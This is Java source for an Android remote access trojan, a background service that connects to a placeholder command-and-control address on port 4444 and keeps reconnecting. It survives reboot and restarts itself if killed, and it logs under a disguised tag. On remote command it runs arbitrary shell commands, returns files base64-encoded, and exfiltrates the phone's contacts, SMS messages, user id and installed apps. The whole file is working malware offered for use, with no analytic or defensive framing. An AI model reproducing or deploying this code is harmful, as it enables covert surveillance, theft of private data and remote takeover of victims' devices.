package com.syp.rat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * RatService.java — Android background RAT service
 * compile into APK with Android Studio or gradlew
 * registers as BOOT_COMPLETED receiver for persistence
 *
 * permissions needed in AndroidManifest.xml:
 *   INTERNET, READ_CONTACTS, READ_SMS, CAMERA,
 *   RECORD_AUDIO, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE,
 *   RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE
 */
public class RatService extends Service {

    private static final String C2_HOST = "YOUR_C2_IP";
    private static final int    C2_PORT = 4444;
    private static final String TAG     = "ConfigSync";
    private ExecutorService pool = Executors.newFixedThreadPool(3);

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        pool.execute(this::connectLoop);
        return START_STICKY;   // auto-restart if killed
    }

    @Override public IBinder onBind(Intent i) { return null; }

    // ── framing ───────────────────────────────────────────────────────────────
    private void sendMsg(DataOutputStream out, String msg) throws IOException {
        byte[] data = msg.getBytes("UTF-8");
        out.writeInt(data.length);
        out.write(data);
        out.flush();
    }

    private String recvMsg(DataInputStream in) throws IOException {
        int len = in.readInt();
        byte[] buf = new byte[len];
        in.readFully(buf);
        return new String(buf, "UTF-8");
    }

    // ── device info ───────────────────────────────────────────────────────────
    private String deviceInfo() {
        return "{\"manufacturer\":\"" + android.os.Build.MANUFACTURER + "\","
             + "\"model\":\""         + android.os.Build.MODEL         + "\","
             + "\"version\":\""       + android.os.Build.VERSION.RELEASE + "\","
             + "\"sdk\":"             + android.os.Build.VERSION.SDK_INT + "}";
    }

    // ── shell exec ────────────────────────────────────────────────────────────
    private String shell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = br.readLine()) != null) sb.append(l).append("\n");
            return sb.toString().trim();
        } catch (Exception e) { return "[err] " + e.getMessage(); }
    }

    // ── read file ──────────────────────────────────────────────────────────────
    private String readFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "[missing]";
            FileInputStream fis = new FileInputStream(f);
            byte[] buf = new byte[(int)Math.min(f.length(), 65536)];
            fis.read(buf); fis.close();
            return Base64.encodeToString(buf, Base64.NO_WRAP);
        } catch (Exception e) { return "[err] " + e.getMessage(); }
    }

    // ── exfil ─────────────────────────────────────────────────────────────────
    private String exfil() {
        StringBuilder sb = new StringBuilder("{");
        String[] targets = {
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            "/sdcard/Download",
            "/proc/net/arp",
        };
        sb.append("\"contacts\":\"").append(readContacts()).append("\",");
        sb.append("\"sms\":\"").append(shell("content query --uri content://sms --projection address,body | head -100")).append("\",");
        sb.append("\"shell_whoami\":\"").append(shell("id")).append("\",");
        sb.append("\"installed_apps\":\"").append(shell("pm list packages | head -50")).append("\"");
        sb.append("}");
        return sb.toString();
    }

    private String readContacts() {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            StringBuilder sb = new StringBuilder();
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(":").append(number).append(";");
                }
                cursor.close();
            }
            return sb.toString();
        } catch (Exception e) { return "[no perm]"; }
    }

    // ── main session loop ─────────────────────────────────────────────────────
    private void session(Socket sock) throws Exception {
        DataInputStream  in  = new DataInputStream(sock.getInputStream());
        DataOutputStream out = new DataOutputStream(sock.getOutputStream());
        sendMsg(out, "{\"hello\":" + deviceInfo() + "}");
        while (true) {
            String raw = recvMsg(in);
            String cmd = "", args = "";
            // simple JSON parse
            if (raw.contains("\"cmd\"")) {
                cmd  = raw.replaceAll(".*\"cmd\"\\s*:\\s*\"([^\"]+)\".*","$1").toUpperCase();
                args = raw.replaceAll(".*\"args\"\\s*:\\s*\"([^\"]*)\".*","$1");
            }
            String result;
            switch (cmd) {
                case "SHELL":   result = shell(args);    break;
                case "EXFIL":   result = exfil();        break;
                case "GET":     result = "FILE_B64:" + readFile(args); break;
                case "SYSINFO": result = deviceInfo();   break;
                case "EXIT":    return;
                default:        result = "unknown: " + cmd;
            }
            sendMsg(out, "{\"status\":\"ok\",\"data\":\"" +
                result.replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n") + "\"}");
        }
    }

    private void connectLoop() {
        while (true) {
            try {
                Socket sock = new Socket(C2_HOST, C2_PORT);
                session(sock);
                sock.close();
            } catch (Exception e) {
                Log.d(TAG, "reconnect");
            }
            try { Thread.sleep(15000); } catch (Exception e) {}
        }
    }
}
